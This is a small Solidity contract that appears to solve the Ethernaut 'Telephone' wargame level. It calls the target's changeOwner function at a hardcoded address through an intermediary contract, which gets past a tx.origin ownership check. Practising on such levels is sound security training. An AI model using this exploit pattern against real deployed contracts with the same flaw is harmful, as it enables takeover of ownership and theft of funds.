/**
 *Submitted for verification at Etherscan.io on 2022-07-21
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.7.5;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract EthernautTelephone {
    Telephone telephone = Telephone(0x22320A9A944e63F18fb34fBB126678BFE0E8CBA1);

    function beOwner(address owner) public {
        telephone.changeOwner(owner);
    }
}